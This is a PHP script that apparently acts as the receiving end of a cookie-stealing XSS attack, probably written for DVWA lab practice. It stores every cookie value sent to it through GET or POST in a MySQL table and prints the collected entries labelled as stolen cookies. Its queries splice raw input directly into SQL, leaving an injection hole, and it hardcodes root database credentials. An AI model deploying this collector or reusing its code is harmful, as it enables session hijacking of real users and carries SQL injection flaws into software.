<?php
header("content-type:text/html;charset=utf-8");
$conn=mysql_connect("localhost","root","root");
mysql_select_db("dvwacookie",$conn);
if(isset($_GET['data']))
{
    $sql="insert into low(cookie) values('".$_GET['data']."');";
    $result=mysql_query($sql,$conn);
    mysql_close();
}
else if(isset($_POST['data']))
{
    $sql="insert into low(cookie) values('".$_POST['data']."');";
    $result=mysql_query($sql,$conn);
    mysql_close();
}
else
{
    $sql="select * from low";
    $result=mysql_query($sql,$conn);
    while($row=mysql_fetch_array($result))
    {
        echo "偷取的cookie:".$row[1]."</br>";
    }
    mysql_close();
}
?>